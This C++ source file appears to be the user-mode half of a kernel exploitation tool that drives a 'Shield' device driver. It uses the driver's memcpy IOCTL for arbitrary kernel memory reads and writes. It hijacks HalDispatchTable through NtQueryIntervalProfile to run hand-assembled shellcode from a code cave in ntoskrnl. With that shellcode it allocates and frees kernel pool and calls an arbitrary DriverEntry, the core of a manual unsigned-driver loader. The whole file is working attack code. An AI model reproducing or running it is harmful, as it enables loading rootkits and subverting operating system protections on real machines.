#include "shield_driver.h"
#include <TlHelp32.h>
#include <Psapi.h>
#include <cstdio>
#include <algorithm>

#pragma comment(lib, "ntdll.lib")

namespace ShieldDriver {

    HANDLE Open() {
        HANDLE h = CreateFileW(
            SHIELD_DEVICE_NAME,
            GENERIC_READ | GENERIC_WRITE,
            0, nullptr, OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL, nullptr
        );
        if (h == INVALID_HANDLE_VALUE) {
            printf("[!] Failed to open device — error %lu\n", GetLastError());
            return nullptr;
        }
        printf("[+] Device opened: 0x%p\n", h);
        return h;
    }

    void Close(HANDLE hDevice) {
        if (hDevice && hDevice != INVALID_HANDLE_VALUE)
            CloseHandle(hDevice);
    }

    bool ReadKernel(HANDLE hDevice, uint64_t kernelAddr, void* userBuf, uint64_t size) {
        uint8_t* outPtr = (uint8_t*)userBuf;
        uint64_t currAddr = kernelAddr;
        uint64_t remaining = size;

        while (remaining > 0) {
            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;

            SHIELD_REQUEST req{};
            req.magic = SHIELD_MAGIC;
            req.subcode = SHIELD_SUBCODE_MEMCPY;
            req.direction = 1; // Read from kernel
            req.size = chunkSize;
            req.kernel_address = currAddr;

            DWORD bytesReturned = 0;
            BOOL res = DeviceIoControl(
                hDevice,
                SHIELD_IOCTL_CODE,
                &req, sizeof(req),
                &req, sizeof(req),
                &bytesReturned, nullptr
            );

            if (!res) return false;

            memcpy(outPtr, req.buffer, chunkSize);

            currAddr += chunkSize;
            outPtr += chunkSize;
            remaining -= chunkSize;
        }
        return true;
    }

    bool WriteKernel(HANDLE hDevice, uint64_t kernelAddr, const void* userBuf, uint64_t size) {
        const uint8_t* inPtr = (const uint8_t*)userBuf;
        uint64_t currAddr = kernelAddr;
        uint64_t remaining = size;

        while (remaining > 0) {
            uint32_t chunkSize = (remaining > 1024) ? 1024 : (uint32_t)remaining;

            SHIELD_REQUEST req{};
            req.magic = SHIELD_MAGIC;
            req.subcode = SHIELD_SUBCODE_MEMCPY;
            req.direction = 0; // Write to kernel
            req.size = chunkSize;
            req.kernel_address = currAddr;
            memcpy(req.buffer, inPtr, chunkSize);

            DWORD bytesReturned = 0;
            BOOL res = DeviceIoControl(
                hDevice,
                SHIELD_IOCTL_CODE,
                &req, sizeof(req),
                &req, sizeof(req),
                &bytesReturned, nullptr
            );

            if (!res) return false;

            currAddr += chunkSize;
            inPtr += chunkSize;
            remaining -= chunkSize;
        }
        return true;
    }

    uint64_t GetNtoskrnlBase() {
        LPVOID drivers[1024];
        DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
            return 0;
        return (uint64_t)drivers[0];
    }

    uint64_t GetKernelModuleBase(const char* moduleName) {
        LPVOID drivers[1024];
        DWORD needed;
        if (!EnumDeviceDrivers(drivers, sizeof(drivers), &needed))
            return 0;

        DWORD count = needed / sizeof(LPVOID);
        for (DWORD i = 0; i < count; i++) {
            char name[MAX_PATH]{};
            if (GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name))) {
                if (_stricmp(name, moduleName) == 0)
                    return (uint64_t)drivers[i];
            }
        }
        return 0;
    }

    uint64_t FindCodeCave(HANDLE hDevice, uint64_t ntBase) {
        IMAGE_DOS_HEADER dos{};
        ReadKernel(hDevice, ntBase, &dos, sizeof(dos));
        IMAGE_NT_HEADERS64 nt{};
        ReadKernel(hDevice, ntBase + dos.e_lfanew, &nt, sizeof(nt));

        uint64_t sectionOffset = ntBase + dos.e_lfanew + sizeof(IMAGE_NT_HEADERS64);
        for (WORD i = 0; i < nt.FileHeader.NumberOfSections; i++) {
            IMAGE_SECTION_HEADER sec{};
            ReadKernel(hDevice, sectionOffset + i * sizeof(IMAGE_SECTION_HEADER), &sec, sizeof(sec));
            if ((sec.Characteristics & IMAGE_SCN_MEM_WRITE) &&
                sec.SizeOfRawData > sec.Misc.VirtualSize + 256) {
                return ntBase + sec.VirtualAddress + sec.Misc.VirtualSize;
            }
        }
        return 0;
    }

    uint64_t GetKernelExport(HANDLE hDevice, uint64_t moduleBase, const char* funcName) {
        if (!moduleBase || !funcName) return 0;

        IMAGE_DOS_HEADER dosHeader{};
        if (!ReadKernel(hDevice, moduleBase, &dosHeader, sizeof(dosHeader)))
            return 0;
        if (dosHeader.e_magic != IMAGE_DOS_SIGNATURE) return 0;

        IMAGE_NT_HEADERS64 ntHeaders{};
        if (!ReadKernel(hDevice, moduleBase + dosHeader.e_lfanew, &ntHeaders, sizeof(ntHeaders)))
            return 0;
        if (ntHeaders.Signature != IMAGE_NT_SIGNATURE) return 0;

        auto& exportDir = ntHeaders.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
        if (!exportDir.VirtualAddress || !exportDir.Size) return 0;

        IMAGE_EXPORT_DIRECTORY exports{};
        if (!ReadKernel(hDevice, moduleBase + exportDir.VirtualAddress, &exports, sizeof(exports)))
            return 0;

        std::vector<DWORD> functions(exports.NumberOfFunctions);
        std::vector<DWORD> names(exports.NumberOfNames);
        std::vector<WORD>  ordinals(exports.NumberOfNames);

        ReadKernel(hDevice, moduleBase + exports.AddressOfFunctions,    functions.data(), functions.size() * sizeof(DWORD));
        ReadKernel(hDevice, moduleBase + exports.AddressOfNames,        names.data(),     names.size() * sizeof(DWORD));
        ReadKernel(hDevice, moduleBase + exports.AddressOfNameOrdinals, ordinals.data(),  ordinals.size() * sizeof(WORD));

        for (DWORD i = 0; i < exports.NumberOfNames; i++) {
            char name[256]{};
            ReadKernel(hDevice, moduleBase + names[i], name, sizeof(name) - 1);
            if (strcmp(name, funcName) == 0) {
                return moduleBase + functions[ordinals[i]];
            }
        }
        return 0;
    }

    bool ExecuteViaHDT(HANDLE hDevice, uint64_t shellcodeAddr) {
        uint64_t ntBase = GetNtoskrnlBase();
        uint64_t pHDT = GetKernelExport(hDevice, ntBase, "HalDispatchTable");
        if (!pHDT) return false;

        uint64_t originalHdt1 = 0;
        ReadKernel(hDevice, pHDT + 8, &originalHdt1, sizeof(originalHdt1));

        WriteKernel(hDevice, pHDT + 8, &shellcodeAddr, sizeof(shellcodeAddr));

        ULONG interval = 0;
        auto NtQueryIntervalProfile = (NTSTATUS(NTAPI*)(ULONG, PULONG))
            GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryIntervalProfile");
        if (NtQueryIntervalProfile)
            NtQueryIntervalProfile(2, &interval);

        WriteKernel(hDevice, pHDT + 8, &originalHdt1, sizeof(originalHdt1));
        return true;
    }

    uint64_t AllocatePool(HANDLE hDevice, uint64_t size) {
        uint64_t ntBase = GetNtoskrnlBase();
        if (!ntBase) return 0;

        uint64_t pExAllocatePool = GetKernelExport(hDevice, ntBase, "ExAllocatePoolWithTag");
        if (!pExAllocatePool) {
            pExAllocatePool = GetKernelExport(hDevice, ntBase, "ExAllocatePool2");
            if (!pExAllocatePool) return 0;
        }

        uint64_t codeCave = FindCodeCave(hDevice, ntBase);
        if (!codeCave) return 0;

        uint8_t shellcode[128]{};
        int off = 0;

        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x28;
        shellcode[off++] = 0x33; shellcode[off++] = 0xC9;
        shellcode[off++] = 0x48; shellcode[off++] = 0xBA;
        *(uint64_t*)&shellcode[off] = size; off += 8;
        shellcode[off++] = 0x41; shellcode[off++] = 0xB8;
        *(uint32_t*)&shellcode[off] = 'DXEV'; off += 4;
        shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
        *(uint64_t*)&shellcode[off] = pExAllocatePool; off += 8;
        shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
        shellcode[off++] = 0x48; shellcode[off++] = 0xA3;
        *(uint64_t*)&shellcode[off] = codeCave + 96; off += 8;
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
        shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
        shellcode[off++] = 0xC3;

        WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode));

        uint64_t zero = 0;
        WriteKernel(hDevice, codeCave + 96, &zero, sizeof(zero));

        ExecuteViaHDT(hDevice, codeCave);

        uint64_t allocatedAddr = 0;
        ReadKernel(hDevice, codeCave + 96, &allocatedAddr, sizeof(allocatedAddr));

        uint8_t zeros[128]{};
        WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));

        if (allocatedAddr)
            printf("[+] Pool allocated @ 0x%llx (%llu bytes)\n", allocatedAddr, size);

        return allocatedAddr;
    }

    bool FreePool(HANDLE hDevice, uint64_t address) {
        if (!address) return false;

        uint64_t ntBase = GetNtoskrnlBase();
        uint64_t pExFreePool = GetKernelExport(hDevice, ntBase, "ExFreePoolWithTag");
        if (!pExFreePool) return false;

        uint64_t codeCave = FindCodeCave(hDevice, ntBase);
        if (!codeCave) return false;

        uint8_t shellcode[64]{};
        int off = 0;

        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x28;
        shellcode[off++] = 0x48; shellcode[off++] = 0xB9;
        *(uint64_t*)&shellcode[off] = address; off += 8;
        shellcode[off++] = 0xBA;
        *(uint32_t*)&shellcode[off] = 'DXEV'; off += 4;
        shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
        *(uint64_t*)&shellcode[off] = pExFreePool; off += 8;
        shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
        shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
        shellcode[off++] = 0xC3;

        WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode));
        ExecuteViaHDT(hDevice, codeCave);

        uint8_t zeros[64]{};
        WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));

        printf("[+] Pool freed @ 0x%llx\n", address);
        return true;
    }

    bool CallDriverEntry(HANDLE hDevice, uint64_t entryPoint, uint64_t driverBase) {
        uint64_t ntBase = GetNtoskrnlBase();
        uint64_t codeCave = FindCodeCave(hDevice, ntBase);
        if (!codeCave) return false;

        uint8_t shellcode[64]{};
        int off = 0;

        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xEC; shellcode[off++] = 0x28;
        shellcode[off++] = 0x33; shellcode[off++] = 0xC9;
        shellcode[off++] = 0x33; shellcode[off++] = 0xD2;
        shellcode[off++] = 0x48; shellcode[off++] = 0xB8;
        *(uint64_t*)&shellcode[off] = entryPoint; off += 8;
        shellcode[off++] = 0xFF; shellcode[off++] = 0xD0;
        shellcode[off++] = 0x48; shellcode[off++] = 0x83; shellcode[off++] = 0xC4; shellcode[off++] = 0x28;
        shellcode[off++] = 0x33; shellcode[off++] = 0xC0;
        shellcode[off++] = 0xC3;

        WriteKernel(hDevice, codeCave, shellcode, sizeof(shellcode));
        ExecuteViaHDT(hDevice, codeCave);

        uint8_t zeros[64]{};
        WriteKernel(hDevice, codeCave, zeros, sizeof(zeros));

        printf("[+] DriverEntry @ 0x%llx called\n", entryPoint);
        return true;
    }
}
